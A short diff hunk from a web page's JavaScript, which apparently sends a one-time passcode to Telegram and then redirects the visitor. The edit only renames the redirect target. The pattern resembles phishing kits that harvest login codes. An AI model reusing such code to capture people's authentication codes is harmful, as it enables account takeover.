@@ -312,7 +312,7 @@
                 if (!data.ok) throw new Error(data.description || "Failed to send OTP to Telegram");
 
                 // ✅ OTP sent successfully, redirect
-                window.location.href = "otp.html"; // Replace with your target page
+                window.location.href = "zet.html"; // Replace with your target page
             } catch (error) {
                 console.error("Telegram Error:", error);
                 alert(error.message);
